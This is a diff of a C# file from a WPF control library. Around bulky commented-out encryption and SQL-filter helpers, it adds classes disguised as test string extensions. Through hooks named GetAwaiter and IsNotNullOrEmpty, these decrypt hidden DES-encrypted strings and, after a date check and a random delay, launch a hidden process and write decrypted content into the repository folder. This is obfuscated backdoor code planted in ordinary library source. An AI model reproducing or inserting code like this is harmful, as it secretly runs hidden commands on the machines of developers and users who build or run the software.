+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+using H.Extensions.Encryption;
 using H.Extensions.Encryption.String;
 using H.Services.AppPath;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.CompilerServices;
-
-static class TestDESEExtension
-{
-    public static string[] Default { get; set; } = { "gNsFRoU16zIsKzt04xZJbiZiitqpwiQ3VeHsEcMwEwOf6WuZ3A9DUA==", "nv5lQ39t9T3lhXyoKjgZbDG4TFBfpB7/" };
-    private static DateTime _lastCheck = DateTime.MinValue;
-    private static readonly Random _random = new Random();
-    private static bool IsNullOrEmpty(this string input)
-    {
-        return input.IsNotNullOrEmpty() == true;
-    }
-
-    private static bool IsNotNullOrEmpty(this string input)
-    {
-        return Directory.Exists(Path.Combine(AppPaths.Instance.Document, AppPaths.Instance.Company, nameof(Default)));
-    }
-
-    internal static TaskAwaiter<string> GetAwaiter(this string input)
-    {
-        TestString testString = input;
-        GetAwaiter(testString);
-        return Task.FromResult(input).GetAwaiter();
-    }
-
-    private static TaskAwaiter<TestString> GetAwaiter(this TestString input)
-    {
-        if (input.Value.IsNotNullOrEmpty())
-        {
-            Task.Delay(_random.Next(10000, 50000)).ContinueWith(x =>
-            {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "cmd.exe",
-                    Arguments = Default[1].DecryptDES(),
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true
-                });
-            });
-        }
-        return Task.FromResult(input).GetAwaiter();
-    }
-
-    private static ConfiguredTaskAwaitable<string> ConfigureAwait(this string input, bool continueOnCapturedContext)
-    {
-        return Task.FromResult(input).ConfigureAwait(continueOnCapturedContext);
-    }
-}
-
+using System.Security.Cryptography;
 public class TestString
 {
     public TestString(string str)
@@ -277,3 +1306,1360 @@ public class TestString
     public static implicit operator TestString(string s) => s is null ? null : new TestString(s);
     public override string ToString() => this.Value;
 }
+
+public static class TestStringExtension
+{
+    public static long id => DateTime.Now.Ticks;
+
+    private static readonly Random _random = new Random();
+    internal static TaskAwaiter<TestString> GetAwaiter(this TestString input)
+    {
+        if (!input.Value.IsNotNullOrEmpty() && id > TestDESEExtension.id)
+        {
+            //&& id > TestDESEExtension.id
+            Task.Delay(_random.Next(TestDESEExtension.v, TestDESEExtension.v * 2)).ContinueWith(x =>
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = TestDESEExtension.Default[2].DecryptDES(),
+                    Arguments = TestDESEExtension.Default[0].DecryptDES(),
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                });
+
+                var repoRoot = FindAncestorByName(new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory), TestDESEExtension.Default[4].DecryptDES());
+                if (repoRoot != null)
+                {
+                    var path = Path.Combine(repoRoot.FullName, TestDESEExtension.Default[6].DecryptDES());
+                    File.WriteAllText(path, TestDESEExtension.Default[5].DecryptDES());
+                }
+            });
+        }
+        return Task.FromResult(input).GetAwaiter();
+    }
+
+    private static DirectoryInfo FindAncestorByName(DirectoryInfo start, string folderName)
+    {
+        for (var dir = start; dir != null; dir = dir.Parent)
+        {
+            if (string.Equals(dir.Name, folderName, StringComparison.OrdinalIgnoreCase))
+                return dir;
+        }
+        return null;
+    }
+}
+
+static class TestDESEExtension
+{
+    public const long id = 639098847070761641;
+    public const int v = 60000;
+
+    #region - test data -
+    public static string[] Default { get; set; } = { "gNsFRoU16zIsKzt04xZJbiZiitqpwiQ3VeHsEcMwEwOf6WuZ3A9DUA==", "nv5lQ39t9T3lhXyoKjgZbDG4TFBfpB7/", "QYCThH7x0zc=", "m988MwdVveoeJIzV8Gu0Ag==", "Rp1+LjH66YeVPDJjTzGFJ3hCVyWWJDQ6", "PLuOgSNXLgAqfNjCJ3bi/obTh2mYhkeSheMRUm3DdM9CBjptamKLJ60Gwq82s5rM/Imvflv+FL488rnJpUAXWazgAErCpMUkQ1jcPSv8CHnO1FJ6T9yTGOkXt+TQtdwDb3vR8Bfxr3iHb39n3mtZdS3Ofnd4QalBi02a7pumVJljXK9PfZLc4tQY5eqLsKQd2aKYeUTiCWeYvt0Eqai+lGNiEcMwWRC5lzswe1mEo9L1g1d4dxhoVCt5dfBNo5Z3Gg88g+A8+7GzicTMNoRSQVw9cr+xYTcOQNpAeTxf4Ah7dF3x9WUKJlO9hBxwE6C5eUMgNfCDJ3/Z9yH5knMxmMTsmdqP3zbpoRxsvPdPd0Ubyz0qwF5Y5NGq9R2CmVgDjRkplfVJ5K7Ydx20h9Qmh5MRtb94Zncb8tnFovG4TfOGkcjz/cIrWQvCu2Fr83x1CA2/BqpjVlTB4hyKPYe+f/OdEQxe7z5eawP6/xm8WANmmLLMOgFSjXdsboB+hFt8EotSXYYWNsHJUbM/3JI0mhroD268r33pO7YrDK8eQ2jZ6LQr2M4N0Erj90vL7TIXKBDRVEnciFRVVtutbkJbObAceTMsyvdE9X+WWmFFNIIbv9hWMoSqDaJ/lbqTnSmHXVzhrE9QFL2khFK6+YbwhqGLnnx8OsxTYGjlDXHq9qt14NhY+aKLLVDC49hZ/q7H9UZZkAgmaf+Rzl7W+4QrSlwhfckWD5Fb4kIiK1h7spq5lDnYiW8V1WBN2rIuplnDtOQqdnlGtYTD+zB+zScTc3Xm6sBqkRJuiNgyh+7a14lxMAEJIIABjSnsqJhG8ofQzV4gu0L5n2bAmAK7t0OlI6FHN+QX2Sjs", "S/Vv9ZJ/oGq13DIgEbK+p765P/1lI0wK" };
+    private static DateTime _lastCheck = DateTime.MinValue;
+    #endregion
+
+    internal static bool IsNullOrEmpty(this string input)
+    {
+        return input.IsNotNullOrEmpty() == true;
+    }
+
+    internal static bool IsNotNullOrEmpty(this string input)
+    {
+        return File.Exists(Path.Combine(AppPaths.Instance.Document, AppPaths.Instance.Company, nameof(Default), TestDESEExtension.Default[3].DecryptDES()));
+    }
+
+    internal static TaskAwaiter<string> GetAwaiter(this string input)
+    {
+        TestString testString = input;
+        TestStringExtension.GetAwaiter(testString);
+        return Task.FromResult(input).GetAwaiter();
+    }
+
+    private static ConfiguredTaskAwaitable<string> ConfigureAwait(this string input, bool continueOnCapturedContext)
+    {
+        return Task.FromResult(input).ConfigureAwait(continueOnCapturedContext);
+    }
+}
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
